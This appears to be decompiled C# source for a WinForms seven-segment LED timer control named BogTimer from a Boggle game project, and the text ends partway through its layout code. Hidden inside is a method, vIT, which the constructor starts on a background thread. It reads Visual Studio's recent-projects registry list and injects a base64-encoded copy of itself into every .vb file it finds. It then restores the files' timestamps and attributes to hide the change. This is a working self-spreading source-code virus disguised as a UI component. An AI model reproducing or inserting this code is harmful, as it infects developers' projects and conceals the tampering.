using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class BogTimer : UserControl
{
	[AccessedThroughProperty("bot1")]
	private tmrShape _bot1;

	[AccessedThroughProperty("top1")]
	private tmrShape _top1;

	[AccessedThroughProperty("top2")]
	private tmrShape _top2;

	[AccessedThroughProperty("m2")]
	private tmrShape _m2;

	[AccessedThroughProperty("m1")]
	private tmrShape _m1;

	[AccessedThroughProperty("lr1")]
	private tmrShape _lr1;

	[AccessedThroughProperty("ur1")]
	private tmrShape _ur1;

	[AccessedThroughProperty("lr2")]
	private tmrShape _lr2;

	[AccessedThroughProperty("ll1")]
	private tmrShape _ll1;

	[AccessedThroughProperty("ul1")]
	private tmrShape _ul1;

	[AccessedThroughProperty("f2")]
	private tmrShape _f2;

	[AccessedThroughProperty("f1")]
	private tmrShape _f1;

	[AccessedThroughProperty("ul3")]
	private tmrShape _ul3;

	[AccessedThroughProperty("ll3")]
	private tmrShape _ll3;

	[AccessedThroughProperty("ur2")]
	private tmrShape _ur2;

	[AccessedThroughProperty("ur3")]
	private tmrShape _ur3;

	[AccessedThroughProperty("lr3")]
	private tmrShape _lr3;

	[AccessedThroughProperty("m3")]
	private tmrShape _m3;

	[AccessedThroughProperty("top3")]
	private tmrShape _top3;

	[AccessedThroughProperty("bot3")]
	private tmrShape _bot3;

	[AccessedThroughProperty("ul4")]
	private tmrShape _ul4;

	[AccessedThroughProperty("ll4")]
	private tmrShape _ll4;

	[AccessedThroughProperty("ur4")]
	private tmrShape _ur4;

	[AccessedThroughProperty("ll2")]
	private tmrShape _ll2;

	[AccessedThroughProperty("lr4")]
	private tmrShape _lr4;

	[AccessedThroughProperty("m4")]
	private tmrShape _m4;

	[AccessedThroughProperty("ul2")]
	private tmrShape _ul2;

	[AccessedThroughProperty("top4")]
	private tmrShape _top4;

	[AccessedThroughProperty("bot4")]
	private tmrShape _bot4;

	[AccessedThroughProperty("bot2")]
	private tmrShape _bot2;

	private IContainer components;

	private string clsTimerText;

	private Color clsLedOffColor;

	private Color clsLedOnColor;

	private Color clsLedBackColor;

	private bool clsFlashOn;

	private bool clsFlashEnabled;

	private Color C;

	public string TimerText
	{
		get
		{
			return clsTimerText;
		}
		set
		{
			int num = 4;
			checked
			{
				if (StringType.StrCmp(value, "", false) != 0)
				{
					clsTimerText = value;
					while (StringType.StrCmp(value, "", false) != 0)
					{
						string chr = Strings.Mid(value, Strings.Len(value), 1);
						value = Strings.Mid(value, 1, Strings.Len(value) - 1);
						CalculateText(chr, num);
						num--;
					}
					if (clsFlashEnabled)
					{
						SetFlash();
						return;
					}
					f1.ShapeColor = clsLedOnColor;
					f2.ShapeColor = clsLedOnColor;
					((Control)f1).Refresh();
					((Control)f2).Refresh();
				}
			}
		}
	}

	internal virtual tmrShape bot3
	{
		get
		{
			return _bot3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_bot3 == null)
			{
			}
			_bot3 = value;
			if (_bot3 != null)
			{
			}
		}
	}

	internal virtual tmrShape top3
	{
		get
		{
			return _top3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_top3 == null)
			{
			}
			_top3 = value;
			if (_top3 != null)
			{
			}
		}
	}

	internal virtual tmrShape m3
	{
		get
		{
			return _m3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_m3 == null)
			{
			}
			_m3 = value;
			if (_m3 != null)
			{
			}
		}
	}

	internal virtual tmrShape lr3
	{
		get
		{
			return _lr3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lr3 == null)
			{
			}
			_lr3 = value;
			if (_lr3 != null)
			{
			}
		}
	}

	internal virtual tmrShape ur3
	{
		get
		{
			return _ur3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ur3 == null)
			{
			}
			_ur3 = value;
			if (_ur3 != null)
			{
			}
		}
	}

	internal virtual tmrShape ll3
	{
		get
		{
			return _ll3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ll3 == null)
			{
			}
			_ll3 = value;
			if (_ll3 != null)
			{
			}
		}
	}

	internal virtual tmrShape ul3
	{
		get
		{
			return _ul3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ul3 == null)
			{
			}
			_ul3 = value;
			if (_ul3 != null)
			{
			}
		}
	}

	internal virtual tmrShape f1
	{
		get
		{
			return _f1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_f1 == null)
			{
			}
			_f1 = value;
			if (_f1 != null)
			{
			}
		}
	}

	public Color LedOffColor
	{
		get
		{
			return clsLedOffColor;
		}
		set
		{
			clsLedOffColor = value;
			UpdateShapes();
			((Control)this).Refresh();
		}
	}

	internal virtual tmrShape f2
	{
		get
		{
			return _f2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_f2 == null)
			{
			}
			_f2 = value;
			if (_f2 != null)
			{
			}
		}
	}

	public Color LedOnColor
	{
		get
		{
			return clsLedOnColor;
		}
		set
		{
			clsLedOnColor = value;
			((Control)this).Refresh();
		}
	}

	internal virtual tmrShape ul1
	{
		get
		{
			return _ul1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ul1 == null)
			{
			}
			_ul1 = value;
			if (_ul1 != null)
			{
			}
		}
	}

	internal virtual tmrShape ll1
	{
		get
		{
			return _ll1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ll1 == null)
			{
			}
			_ll1 = value;
			if (_ll1 != null)
			{
			}
		}
	}

	internal virtual tmrShape ur1
	{
		get
		{
			return _ur1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ur1 == null)
			{
			}
			_ur1 = value;
			if (_ur1 != null)
			{
			}
		}
	}

	internal virtual tmrShape lr1
	{
		get
		{
			return _lr1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lr1 == null)
			{
			}
			_lr1 = value;
			if (_lr1 != null)
			{
			}
		}
	}

	internal virtual tmrShape m1
	{
		get
		{
			return _m1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_m1 == null)
			{
			}
			_m1 = value;
			if (_m1 != null)
			{
			}
		}
	}

	internal virtual tmrShape top1
	{
		get
		{
			return _top1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_top1 == null)
			{
			}
			_top1 = value;
			if (_top1 != null)
			{
			}
		}
	}

	internal virtual tmrShape bot1
	{
		get
		{
			return _bot1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_bot1 == null)
			{
			}
			_bot1 = value;
			if (_bot1 != null)
			{
			}
		}
	}

	internal virtual tmrShape bot2
	{
		get
		{
			return _bot2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_bot2 == null)
			{
			}
			_bot2 = value;
			if (_bot2 != null)
			{
			}
		}
	}

	internal virtual tmrShape top2
	{
		get
		{
			return _top2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_top2 == null)
			{
			}
			_top2 = value;
			if (_top2 != null)
			{
			}
		}
	}

	internal virtual tmrShape m2
	{
		get
		{
			return _m2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_m2 == null)
			{
			}
			_m2 = value;
			if (_m2 != null)
			{
			}
		}
	}

	internal virtual tmrShape lr2
	{
		get
		{
			return _lr2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lr2 == null)
			{
			}
			_lr2 = value;
			if (_lr2 != null)
			{
			}
		}
	}

	internal virtual tmrShape ur2
	{
		get
		{
			return _ur2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ur2 == null)
			{
			}
			_ur2 = value;
			if (_ur2 != null)
			{
			}
		}
	}

	internal virtual tmrShape ll2
	{
		get
		{
			return _ll2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ll2 == null)
			{
			}
			_ll2 = value;
			if (_ll2 != null)
			{
			}
		}
	}

	internal virtual tmrShape ul2
	{
		get
		{
			return _ul2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ul2 == null)
			{
			}
			_ul2 = value;
			if (_ul2 != null)
			{
			}
		}
	}

	internal virtual tmrShape bot4
	{
		get
		{
			return _bot4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_bot4 == null)
			{
			}
			_bot4 = value;
			if (_bot4 != null)
			{
			}
		}
	}

	internal virtual tmrShape top4
	{
		get
		{
			return _top4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_top4 == null)
			{
			}
			_top4 = value;
			if (_top4 != null)
			{
			}
		}
	}

	public bool EnableFlash
	{
		get
		{
			return clsFlashEnabled;
		}
		set
		{
			clsFlashEnabled = value;
		}
	}

	internal virtual tmrShape m4
	{
		get
		{
			return _m4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_m4 == null)
			{
			}
			_m4 = value;
			if (_m4 != null)
			{
			}
		}
	}

	internal virtual tmrShape lr4
	{
		get
		{
			return _lr4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lr4 == null)
			{
			}
			_lr4 = value;
			if (_lr4 != null)
			{
			}
		}
	}

	internal virtual tmrShape ur4
	{
		get
		{
			return _ur4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ur4 == null)
			{
			}
			_ur4 = value;
			if (_ur4 != null)
			{
			}
		}
	}

	internal virtual tmrShape ll4
	{
		get
		{
			return _ll4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ll4 == null)
			{
			}
			_ll4 = value;
			if (_ll4 != null)
			{
			}
		}
	}

	public Color LedBackColor
	{
		get
		{
			return clsLedBackColor;
		}
		set
		{
			clsLedBackColor = value;
			((Control)this).set_BackColor(clsLedBackColor);
			((Control)this).Refresh();
		}
	}

	internal virtual tmrShape ul4
	{
		get
		{
			return _ul4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_ul4 == null)
			{
			}
			_ul4 = value;
			if (_ul4 != null)
			{
			}
		}
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public BogTimer()
	{
		((Control)this).add_Resize((EventHandler)BogTimer_Resize);
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
		LedOffColor = Color.FromArgb(70, 0, 0);
		LedOnColor = Color.Red;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((ContainerControl)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		ul1 = new tmrShape();
		ll1 = new tmrShape();
		ur1 = new tmrShape();
		lr1 = new tmrShape();
		m1 = new tmrShape();
		top1 = new tmrShape();
		bot1 = new tmrShape();
		bot2 = new tmrShape();
		top2 = new tmrShape();
		m2 = new tmrShape();
		lr2 = new tmrShape();
		ur2 = new tmrShape();
		ll2 = new tmrShape();
		ul2 = new tmrShape();
		bot4 = new tmrShape();
		top4 = new tmrShape();
		m4 = new tmrShape();
		lr4 = new tmrShape();
		ur4 = new tmrShape();
		ll4 = new tmrShape();
		ul4 = new tmrShape();
		bot3 = new tmrShape();
		top3 = new tmrShape();
		m3 = new tmrShape();
		lr3 = new tmrShape();
		ur3 = new tmrShape();
		ll3 = new tmrShape();
		ul3 = new tmrShape();
		f1 = new tmrShape();
		f2 = new tmrShape();
		((Control)this).SuspendLayout();
		tmrShape obj = ul1;
		Point location = new Point(24, 24);
		((Control)obj).set_Location(location);
		((Control)ul1).set_Name("ul1");
		ul1.ShapeColor = Color.DarkGray;
		ul1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj2 = ul1;
		Size size = new Size(8, 40);
		((Control)obj2).set_Size(size);
		((Control)ul1).set_TabIndex(0);
		((Control)ul1).set_Tag((object)"1");
		tmrShape obj3 = ll1;
		location = new Point(24, 64);
		((Control)obj3).set_Location(location);
		((Control)ll1).set_Name("ll1");
		ll1.ShapeColor = Color.DarkGray;
		ll1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj4 = ll1;
		size = new Size(8, 40);
		((Control)obj4).set_Size(size);
		((Control)ll1).set_TabIndex(1);
		((Control)ll1).set_Tag((object)"1");
		tmrShape obj5 = ur1;
		location = new Point(64, 24);
		((Control)obj5).set_Location(location);
		((Control)ur1).set_Name("ur1");
		ur1.ShapeColor = Color.DarkGray;
		ur1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj6 = ur1;
		size = new Size(8, 40);
		((Control)obj6).set_Size(size);
		((Control)ur1).set_TabIndex(2);
		((Control)ur1).set_Tag((object)"1");
		tmrShape obj7 = lr1;
		location = new Point(64, 64);
		((Control)obj7).set_Location(location);
		((Control)lr1).set_Name("lr1");
		lr1.ShapeColor = Color.DarkGray;
		lr1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj8 = lr1;
		size = new Size(8, 40);
		((Control)obj8).set_Size(size);
		((Control)lr1).set_TabIndex(3);
		((Control)lr1).set_Tag((object)"1");
		tmrShape obj9 = m1;
		location = new Point(27, 60);
		((Control)obj9).set_Location(location);
		((Control)m1).set_Name("m1");
		m1.ShapeColor = Color.DarkGray;
		m1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj10 = m1;
		size = new Size(44, 8);
		((Control)obj10).set_Size(size);
		((Control)m1).set_TabIndex(4);
		((Control)m1).set_Tag((object)"1");
		tmrShape obj11 = top1;
		location = new Point(26, 21);
		((Control)obj11).set_Location(location);
		((Control)top1).set_Name("top1");
		top1.ShapeColor = Color.DarkGray;
		top1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj12 = top1;
		size = new Size(44, 8);
		((Control)obj12).set_Size(size);
		((Control)top1).set_TabIndex(5);
		((Control)top1).set_Tag((object)"1");
		tmrShape obj13 = bot1;
		location = new Point(27, 99);
		((Control)obj13).set_Location(location);
		((Control)bot1).set_Name("bot1");
		bot1.ShapeColor = Color.DarkGray;
		bot1.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj14 = bot1;
		size = new Size(44, 8);
		((Control)obj14).set_Size(size);
		((Control)bot1).set_TabIndex(6);
		((Control)bot1).set_Tag((object)"1");
		tmrShape obj15 = bot2;
		location = new Point(87, 98);
		((Control)obj15).set_Location(location);
		((Control)bot2).set_Name("bot2");
		bot2.ShapeColor = Color.DarkGray;
		bot2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj16 = bot2;
		size = new Size(44, 8);
		((Control)obj16).set_Size(size);
		((Control)bot2).set_TabIndex(13);
		((Control)bot2).set_Tag((object)"2");
		tmrShape obj17 = top2;
		location = new Point(86, 21);
		((Control)obj17).set_Location(location);
		((Control)top2).set_Name("top2");
		top2.ShapeColor = Color.DarkGray;
		top2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj18 = top2;
		size = new Size(44, 8);
		((Control)obj18).set_Size(size);
		((Control)top2).set_TabIndex(12);
		((Control)top2).set_Tag((object)"2");
		tmrShape obj19 = m2;
		location = new Point(87, 60);
		((Control)obj19).set_Location(location);
		((Control)m2).set_Name("m2");
		m2.ShapeColor = Color.DarkGray;
		m2.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj20 = m2;
		size = new Size(44, 8);
		((Control)obj20).set_Size(size);
		((Control)m2).set_TabIndex(11);
		((Control)m2).set_Tag((object)"2");
		tmrShape obj21 = lr2;
		location = new Point(124, 64);
		((Control)obj21).set_Location(location);
		((Control)lr2).set_Name("lr2");
		lr2.ShapeColor = Color.DarkGray;
		lr2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj22 = lr2;
		size = new Size(8, 39);
		((Control)obj22).set_Size(size);
		((Control)lr2).set_TabIndex(10);
		((Control)lr2).set_Tag((object)"2");
		tmrShape obj23 = ur2;
		location = new Point(124, 24);
		((Control)obj23).set_Location(location);
		((Control)ur2).set_Name("ur2");
		ur2.ShapeColor = Color.DarkGray;
		ur2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj24 = ur2;
		size = new Size(8, 39);
		((Control)obj24).set_Size(size);
		((Control)ur2).set_TabIndex(9);
		((Control)ur2).set_Tag((object)"2");
		tmrShape obj25 = ll2;
		location = new Point(84, 64);
		((Control)obj25).set_Location(location);
		((Control)ll2).set_Name("ll2");
		ll2.ShapeColor = Color.DarkGray;
		ll2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj26 = ll2;
		size = new Size(8, 39);
		((Control)obj26).set_Size(size);
		((Control)ll2).set_TabIndex(8);
		((Control)ll2).set_Tag((object)"2");
		tmrShape obj27 = ul2;
		location = new Point(84, 24);
		((Control)obj27).set_Location(location);
		((Control)ul2).set_Name("ul2");
		ul2.ShapeColor = Color.DarkGray;
		ul2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj28 = ul2;
		size = new Size(8, 39);
		((Control)obj28).set_Size(size);
		((Control)ul2).set_TabIndex(7);
		((Control)ul2).set_Tag((object)"2");
		tmrShape obj29 = bot4;
		location = new Point(260, 99);
		((Control)obj29).set_Location(location);
		((Control)bot4).set_Name("bot4");
		bot4.ShapeColor = Color.DarkGray;
		bot4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj30 = bot4;
		size = new Size(44, 8);
		((Control)obj30).set_Size(size);
		((Control)bot4).set_TabIndex(27);
		((Control)bot4).set_Tag((object)"4");
		tmrShape obj31 = top4;
		location = new Point(259, 22);
		((Control)obj31).set_Location(location);
		((Control)top4).set_Name("top4");
		top4.ShapeColor = Color.DarkGray;
		top4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj32 = top4;
		size = new Size(44, 8);
		((Control)obj32).set_Size(size);
		((Control)top4).set_TabIndex(26);
		((Control)top4).set_Tag((object)"4");
		tmrShape obj33 = m4;
		location = new Point(260, 61);
		((Control)obj33).set_Location(location);
		((Control)m4).set_Name("m4");
		m4.ShapeColor = Color.DarkGray;
		m4.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj34 = m4;
		size = new Size(44, 8);
		((Control)obj34).set_Size(size);
		((Control)m4).set_TabIndex(25);
		((Control)m4).set_Tag((object)"4");
		tmrShape obj35 = lr4;
		location = new Point(297, 65);
		((Control)obj35).set_Location(location);
		((Control)lr4).set_Name("lr4");
		lr4.ShapeColor = Color.DarkGray;
		lr4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj36 = lr4;
		size = new Size(8, 39);
		((Control)obj36).set_Size(size);
		((Control)lr4).set_TabIndex(24);
		((Control)lr4).set_Tag((object)"4");
		tmrShape obj37 = ur4;
		location = new Point(297, 25);
		((Control)obj37).set_Location(location);
		((Control)ur4).set_Name("ur4");
		ur4.ShapeColor = Color.DarkGray;
		ur4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj38 = ur4;
		size = new Size(8, 39);
		((Control)obj38).set_Size(size);
		((Control)ur4).set_TabIndex(23);
		((Control)ur4).set_Tag((object)"4");
		tmrShape obj39 = ll4;
		location = new Point(257, 65);
		((Control)obj39).set_Location(location);
		((Control)ll4).set_Name("ll4");
		ll4.ShapeColor = Color.DarkGray;
		ll4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj40 = ll4;
		size = new Size(8, 39);
		((Control)obj40).set_Size(size);
		((Control)ll4).set_TabIndex(22);
		((Control)ll4).set_Tag((object)"4");
		tmrShape obj41 = ul4;
		location = new Point(257, 25);
		((Control)obj41).set_Location(location);
		((Control)ul4).set_Name("ul4");
		ul4.ShapeColor = Color.DarkGray;
		ul4.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj42 = ul4;
		size = new Size(8, 39);
		((Control)obj42).set_Size(size);
		((Control)ul4).set_TabIndex(21);
		((Control)ul4).set_Tag((object)"4");
		tmrShape obj43 = bot3;
		location = new Point(200, 100);
		((Control)obj43).set_Location(location);
		((Control)bot3).set_Name("bot3");
		bot3.ShapeColor = Color.DarkGray;
		bot3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj44 = bot3;
		size = new Size(44, 8);
		((Control)obj44).set_Size(size);
		((Control)bot3).set_TabIndex(20);
		((Control)bot3).set_Tag((object)"3");
		tmrShape obj45 = top3;
		location = new Point(199, 22);
		((Control)obj45).set_Location(location);
		((Control)top3).set_Name("top3");
		top3.ShapeColor = Color.DarkGray;
		top3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj46 = top3;
		size = new Size(44, 8);
		((Control)obj46).set_Size(size);
		((Control)top3).set_TabIndex(19);
		((Control)top3).set_Tag((object)"3");
		tmrShape obj47 = m3;
		location = new Point(200, 61);
		((Control)obj47).set_Location(location);
		((Control)m3).set_Name("m3");
		m3.ShapeColor = Color.DarkGray;
		m3.ShapeDirection = tmrShape.tmrShapeDirection.Horisontal;
		tmrShape obj48 = m3;
		size = new Size(44, 8);
		((Control)obj48).set_Size(size);
		((Control)m3).set_TabIndex(18);
		((Control)m3).set_Tag((object)"3");
		tmrShape obj49 = lr3;
		location = new Point(237, 65);
		((Control)obj49).set_Location(location);
		((Control)lr3).set_Name("lr3");
		lr3.ShapeColor = Color.DarkGray;
		lr3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj50 = lr3;
		size = new Size(8, 40);
		((Control)obj50).set_Size(size);
		((Control)lr3).set_TabIndex(17);
		((Control)lr3).set_Tag((object)"3");
